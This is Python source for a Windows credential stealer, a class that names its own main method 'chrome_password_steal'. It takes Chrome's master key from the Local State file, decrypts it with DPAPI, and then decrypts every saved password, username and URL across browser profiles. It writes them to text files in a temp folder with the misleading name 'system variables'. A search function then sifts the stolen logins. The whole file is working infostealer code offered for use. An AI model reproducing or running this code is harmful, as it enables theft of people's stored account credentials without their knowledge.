from Cryptodome.Cipher import AES
from os import listdir
from os.path import isfile, join
import sqlite3
import json
import base64
import sqlite3
import win32crypt
import shutil
from datetime import timezone, datetime, timedelta
import base64
import os
import time
import subprocess
import requests
import tempfile

class Chrome_passwords():

    def chrome_password_steal(self):
        def temp():
            temp_loc = tempfile.gettempdir()
            directory = "system variables"
            path = os.path.join(temp_loc,directory)
            return path


        def createPath():
            path = temp()
            try:
                os.mkdir(path)
            except Exception:
                pass

  

        def get_chrome_datetime(chromedate):
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


        def get_master_key():
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r" ,encoding='iso-8859-1') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:] 
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

        def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)

        def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)

        def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = generate_cipher(master_key, iv)
                decrypted_pass = decrypt_payload(cipher, payload)
                decrypted_pass = decrypted_pass[:-16].decode() 
                return decrypted_pass
            except Exception as e:
                return "Chrome < 80"


        def password():
            main_loc = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data'+os.sep
            possible_location = ["Default",'Guest profile']
            for folder in os.listdir(main_loc):
                if "Profile " in folder:
                    possible_location.append(folder)
                    print(folder)
                    print(possible_location)
            global for_file
            for_file=[]
            master_key = get_master_key()
            for loc in possible_location:
                try:
                    path_db = main_loc + loc + os.sep + 'Login Data For Account'
                    db_loc = temp() + os.sep + "Loginvault.db"
                    shutil.copy2(path_db, db_loc) 
                    conn = sqlite3.connect(db_loc)
                    cursor = conn.cursor()
                    print(path_db)
                
                    try:
                        fileloc = os.path.join(temp(),'Chrome_'+loc+".txt")
                        with open(fileloc,'w') as f:
                            cursor.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

                            for r in cursor.fetchall():
                                url = r[0]
                                username = r[1]
                                encrypted_password = r[2]
                                decrypted_password = decrypt_password(encrypted_password, master_key)
                                date_created = r[3]
                                date_last_used = r[4]
                                if len(username) >0:
                                    url = r[0]
                                    username = r[1]
                                    encrypted_password = r[2]
                                    decrypted_password = decrypt_password(encrypted_password, master_key)
                                    date_created = r[3]
                                    date_last_used = r[4]




                                    for_file.append(f"{'password: '+str(decrypted_password)}")
                                    for_file.append(f"{'username: '+username}")
                                    for_file.append(f"{'url: '+url}")


                                    if date_created != 86400000000 and date_created:
                                        for_file.append(f"Creation date: {str(get_chrome_datetime(date_created))}")

                                    if date_last_used != 86400000000 and date_last_used:
                                        for_file.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")

                                    for_file.append('\n'+("-"*60))
                        f.close()


                    except Exception as e:
                        print(e)
                        pass
                    cursor.close()
                    conn.close()
                    try:
                        os.remove(db_loc)
                        time.sleep(0.2)
                    except Exception as e:
                        pass
                    for_file.append("^^#others "+loc)
                except:
                    pass
                
            for loc in possible_location:
                try:
                    path_db = main_loc + loc + os.sep + 'Login Data'
                    db_loc = temp() + os.sep + "Loginvault.db"
                    shutil.copy2(path_db, db_loc) 
                    conn = sqlite3.connect(db_loc)
                    cursor = conn.cursor()
                    print(path_db)
                    try:
                        fileloc = os.path.join(temp(),'Chrome_'+loc+".txt")
                        with open(fileloc,'w') as f:
                            cursor.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

                            for r in cursor.fetchall():
                                url = r[0]
                                username = r[1]
                                encrypted_password = r[2]
                                decrypted_password = decrypt_password(encrypted_password, master_key)
                                date_created = r[3]
                                date_last_used = r[4]
                                if len(username) >0:
                                    url = r[0]
                                    username = r[1]
                                    encrypted_password = r[2]
                                    decrypted_password = decrypt_password(encrypted_password, master_key)
                                    date_created = r[3]
                                    date_last_used = r[4]




                                    for_file.append(f"{'password: '+str(decrypted_password)}")
                                    for_file.append(f"{'username: '+username}")
                                    for_file.append(f"{'url: '+url}")


                                    if date_created != 86400000000 and date_created:
                                        for_file.append(f"Creation date: {str(get_chrome_datetime(date_created))}")

                                    if date_last_used != 86400000000 and date_last_used:
                                        for_file.append(f"Last Used: {str(get_chrome_datetime(date_last_used))}")

                                    for_file.append('\n'+("-"*60))
                        f.close()


                    except Exception as e:
                        print(e)
                        pass
                    cursor.close()
                    conn.close()
                    try:
                        os.remove(db_loc)
                        time.sleep(0.2)
                    except Exception as e:
                        pass
                    for_file.append("^^#"+loc)
                except Exception as e:
                    print(e)
                    pass
            for_file=for_file[::-1]
            data=''
            resault=[]
            name_test=[]
            for i in range(len(for_file)):
                if '^^#' in for_file[i]:
                    print(for_file[i])
                    name_test.append
                    c=0
                    for n in range(i,len(for_file)):
                        if c == 1:
                            if  '^^#' not in for_file[n]:
                                data+=for_file[n]
                                data+='\r\n'
                            else:
                                break
                        else:
                            pass
                        c=1
                if len(data)>1 and for_file[i] not in name_test:
                    resault.append(str(for_file[i][3:]).encode())
                    resault.append(data.encode())
                data=''
                    
        
            return resault
                
        
        temp()
        createPath()       
        return password()
        

            
    def advanced_search(self,val):
        passwords=self.chrome_password_steal()
        name=passwords[::2]
        passwords=passwords[1::2]
        t=0
        res=[]
        for i in range(len(passwords)):
            out=str(passwords[i]).split('\\r\\n')
            sevdvar=''
            c=0
            A=str(name[i])
            B='='*len(A)
            for n in range(len(out)):
                if val in out[n]:
                    print(A)
                    t=1
                    C=(out[n-2][:-1])
                    D=(out[n-1][:-1])
                    E=(out[n][:-1])
                    F=(out[n+1][:-1])
                    G=(out[n+2][:-1])
                    if c==0:
                        if ('-'*10)not in C:
                            sevdvar+=A+'\r\n'+B+'\r\n'+C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                            c=1

                        else:
                            sevdvar+=A+'\r\n'+B+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                        
                    else:
                        if ('-'*10)not in C:
                            sevdvar+=C+'\r\n'+D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'

                        else:
                            sevdvar+=D+'\r\n'+E+'\r\n'+F+'\r\n'+G+'\r\n\n'+('-'*15)+'\n'
                    c=1
            res.append(sevdvar)
            sevdvar=''
                                          
        if t<1:
            return["'"+val+"'"+" is not found.."]
        return res







